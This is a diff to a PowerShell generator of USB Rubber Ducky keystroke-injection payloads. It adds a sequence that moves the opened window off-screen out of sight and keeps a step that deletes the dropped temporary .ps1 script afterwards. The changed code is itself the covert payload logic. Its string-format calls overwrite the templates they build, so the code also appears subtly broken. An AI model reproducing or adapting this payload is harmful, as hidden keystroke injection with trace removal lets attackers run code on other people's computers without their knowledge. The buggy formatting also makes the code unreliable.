@@ -19,7 +19,7 @@ See the License for the specific language governing permissions and
 limitations under the License.
 
 Author: Sean Whalen (@SeanTheGeek)
-Version: 1.0.0
+Version: 1.0.1
 Required Dependencies: Java runtime
 Optional Dependencies: None
     
@@ -62,14 +62,8 @@ $MinContent | Out-File $MinPath -Encoding ascii
 $DownArrows = GetDownArrows 61
 $DownArrows = $DownArrows.Trim()
 
-$PreScript = @"
+$HideWindow = @"
 DELAY 750
-GUI
-DELAY 750
-STRING notepad
-ENTER
-DELAY 750
-ENTER
 ALT SPACE
 DELAY 750
 STRING m
@@ -79,7 +73,20 @@ DELAY 750
 ENTER
 "@
 
-$PreScript = [string]::Format($DownArrows)
+$HideWindow = [string]::Format($DownArrows)
+
+$PreScript = @"
+DELAY 750
+GUI
+DELAY 750
+STRING notepad.exe
+ENTER
+DELAY 750
+ENTER
+{0}
+"@
+
+$PreScript = [string]::Format($HideWindow)
 
 $PostScript = @"
 
@@ -99,7 +106,7 @@ ENTER
 DELAY 750
 GUI
 DELAY 750
-STRING powershell Remove-Item %TEMP%\{filename}.ps1
+STRING powershell.exe Remove-Item %TEMP%\{filename}.ps1
 ENTER
 "@
 $PostScript = [string]::Format($RandomFileName)
